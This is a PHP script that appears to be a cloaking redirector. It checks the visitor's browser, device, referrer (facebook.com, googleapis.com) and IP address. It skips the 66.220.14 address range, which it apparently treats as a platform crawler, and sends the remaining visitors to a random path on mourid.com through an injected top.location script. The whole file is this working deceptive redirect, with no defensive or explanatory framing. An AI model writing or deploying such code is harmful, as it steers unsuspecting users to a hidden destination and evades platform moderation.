<?php
//exit();
  ob_start();
    require_once('Mobile_Detect.php');
    require_once('Browser.php');
    $detect = new Mobile_Detect;
    $browser = new Browser();

    function generate_name($length){
        $rname = "";
        $sesli = "aeiou";
        $sessiz = "bcdfghjklmnprstvyz";
        $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
        for($n=0;$n<$length;$n++){
            if(in_array($rname[strlen($rname)-1], str_split($sesli))){
                $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
            }else{
                $rname .= $sesli[rand(0,strlen($sesli)-1)];
            }
        }
        return $rname;
    }

    if(!isset($_SERVER["HTTP_REFERER"])){
        $_SERVER["HTTP_REFERER"] = "";
    }

    $redirect = false;
    if($browser->getBrowser() == Browser::BROWSER_CHROME && $browser->getPlatform() != Browser::PLATFORM_X11 && strpos($_SERVER["REMOTE_ADDR"], "66.220.14") === false) {
        if (strpos($_SERVER["HTTP_REFERER"], 'googleapis.com') !== false){
            $redirect = true;
        }

    
            if (strpos($_SERVER["HTTP_REFERER"], 'wqewqe.') !== false){
            $redirect = true;
        }       if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
            $redirect = true;
        }
    }

    if($detect->isMobile() || $browser->isMobile() && $browser->getPlatform() != Browser::PLATFORM_X11 && strpos($_SERVER["REMOTE_ADDR"], "66.220.14") === false){
        $redirect = true;
    }

    if($redirect == true){
        echo "<script>top.location.href='http://mourid.com/".generate_name(rand(3,5))."'</script>";
    }
?>
